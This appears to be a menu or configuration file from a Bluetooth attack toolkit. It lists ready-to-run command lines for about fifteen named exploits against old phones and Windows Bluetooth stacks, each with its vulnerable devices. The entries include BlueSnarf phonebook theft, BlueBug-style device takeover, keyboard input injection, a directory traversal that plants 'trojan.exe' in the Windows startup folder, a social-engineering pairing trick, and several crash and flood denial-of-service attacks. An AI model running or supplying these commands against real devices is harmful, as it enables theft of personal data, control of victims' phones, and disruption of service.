# BluePIMp; Exploiting the Widcomm BTStackServer by Kevin Finisterre
bluePIMp widcomm stack <= 1.4.2	./exploits/bluepimp @bt_addr@@<opush_chan> <target>; code for exploiting buffer overflow vulnerability in Widcomm Bluetooth Stack <= 1.4.2 variations. this exploit only demonstrates exploitation process, and shows some text string on exploited device. if you want something more - you'll need to play with shellcode inside exploit.\nTARGET values:\n 0. XP Pro SP0   - Ambicom btysb1.4.2w.zip 1.4.2 Build 10\n 1. XP Pro SP0   - Actiontec Bluetooth Software\n 2. XP Pro SP0   - Belkin Bluetooth Software 1.4.2 Build 10\n 3. XP Pro SP1a  - Belkin Bluetooth Software 1.4.2 Build 10\n 4. XP Home SP1a (and Pro?) - Belkin Bluetooth Software 1.4.2 Build 10\n 5 .Crash

# Bluebugger v0.1 by Martin J. Muench. Creates a serial profile connection without authorization
bluebugger v0.1	./exploits/bluebugger -a @bt_addr@ ; creates a serial profile connection without authorization. vulnerable: Nokia 6310i, Motorola V600, V80, Sony-Ericsson T610

# BlueSmack in Toshiba BT Stack for Windows <=4.0.23 by trifinite.group
bluesmack Toshiba Stack <=4.0.23	l2ping -i @hci@ -s 31337 @bt_addr@ ; L2CAP 'Ping of Death' DoS attack for Toshiba Bluetooth Stack for Windows <=4.0.23
#
# BlueSnarf by Marcel Holtmann
bluesnarf phonebook	./tools/btobex -i @hci@ getpb @bt_addr@ <opush_chan> ; the BlueSnarf attack connects to an OBEX Push target and performs an OBEX GET request for known filenames such as 'telecom/pb.vcf' for the devices phone book (there are many more names of files in the IrMC Specification). in case of improper implementation of the device firmware, an attacker is able to retrieve all files where the name is either known or guessed correctly. vulnerable: Ericsson T68, Sony-Ericsson R520m, T68i, T610, Z1010, Z600, Nokia 6310, 6310i, 8910, 8910i
#
# BlueSnarf++
bluesnarf++	./tools/btftp -i @hci@ @bt_addr@ <opush_chan> ; BlueSnarf++ is similar to BlueSnarf attack, but it gives the attacker full read/write access when connecting to the OBEX Push Profile. instead of a less functional OBEX Push daemon, these devices run an OBEX FTP server that can be connected as the OBEX Push service without pairing. vulnerable: Ericsson T68, Sony-Ericsson R520m, T68i, T610, Z1010, Z600, Nokia 6310, 6310i, 8910, 8910i

#
# helomoto by Adam Laurie. Insert a device into "Device History" on Motorola mobile phones
helomoto	./exploits/helomoto -i @hci@ plant @bt_addr@ <opush_chan> ; the HeloMoto attack takes advantage of the incorrect implementation of the 'trusted device' handling on some Motorola devices. the attacker initiates a connection to the unathenticated OBEX Push Profile pretending to send a vCard. the attacker interrupts the sending process and without interaction the attacker's device is stored in the 'list of trusted devices' on the victim's phone. With an entry in that list, the attacker is able to connect to the headset profile without authentication. once connected to this service, the attacker is able to take control of the device by means of AT-commands (as BlueBug). vulnerable: Motorola V80, V5xx, V6xx, E398
#
# hidattack v0.1 by Collin R. Mulliner
hidattack	./exploits/hidattack -e ./tools/hidattack.inp -c @bt_addr@ ; attacking HID host implementations - something like hijacking keyboards or mices etc. with selected command line parameters we can inject some chars from 'hidattack.inp' file, wich contains events like /dev/input/event. also can be run in server mode, please see tool's help. also try to find xkbd-bthid tool aka Collin's Bluetooth Keyboard on web.

# IVT BluSoleil Bluetooth Stack 1.4 Directory Traversal by Kevin Finisterre
ivt blusoleil btstack dotdot	./tools/ussp-push --dev @hci_num@ @bt_addr@@<opush_chan> trojan.exe ../../../../../windows/startup/holyshit.exe ; IVT BluSoleil Bluetooth Stack 1.4 Directory Traversal exploitation.
#
# l2ping -f DoS
l2ping flood DoS	l2ping -i @hci@ -f @bt_addr@ ; L2CAP echo requests flood causes DoS. vulnerable: Nokia 7610, 7650, 6600, Siemens V55, Motorola S55 and many other devices
#
# Mode3 abuse
mode3 abuse with SE	python ./exploits/mod3abuse.py @hci@ <text> @bt_addr@ ; mod3 abuse idea is to force authentification on benign tasks (like vCard exchange or OBEX push) so devices will be paired, and than connect to services that don't request authorisation. mode3 abuse script - get pairing using social engeneering. on remote device (mostly phone) will be displayed something like 'enter PIN for <text>?'. and if you'll change <text> to something like 'PIN:1234'? imagine yourself.

# Nokia 9550 vCard Dos
nokia 9550 vCard Dos	./tools/btobex -i @hci@ push @bt_addr@ <opush_chan> ../exploits/nokia9550_vcard_dos.vcf ; sending specially crafted vCard causes DoS on Nokia 9550
#
# Nokia N70 l2cap packet DoS by Pierre Betouin
nokia N70 l2cap DoS	./exploits/nokiaN70_l2cap_packet_dos @bt_addr@ ; sending specially crafted L2CAP packet causes DoS on Nokia N70
#
# OPUSH malformed file name DoS by A.Ramos, NCNIPC, K.Finisterre, M.Bialoglowy, ^_^
opush malformed file name DoS	./tools/ussp-push --dev @hci_num@ @bt_addr@@<opush_chan> ./tools/ussp-push <file_name> ; this exploit may cause a DoS in OBEX service until device reboot. for exploitation you need to push some file with specially crafted file name. filenames for cause DoS on:\n Nokia 7610, 3210, N70, N73 - ':' or '\' or '/' or SPACE in name. \n Sony-Ericsson P900 - name lenght > 197 \n HP iPAQ - name lenght > 232 \n AmbiCom Blue Neighbors <= v2.50 - name lenght > 256

# Sony-Ericsson (K600i, V600i, K750i, W800i) reset display PoC by Pierre Betouin
sony-ericsson reset display	./exploits/sonyericsson_reset_display @bt_addr@ ; this exploit can cause display resetting on Sony-Ericsson K600i, V600i, K750i, W800i by sending specially crafted L2CAP packet. vulnerable devices will slowly turn their screen into black and then display a white screen. after a short period (~45sec), they will go back to their normal behaviour.
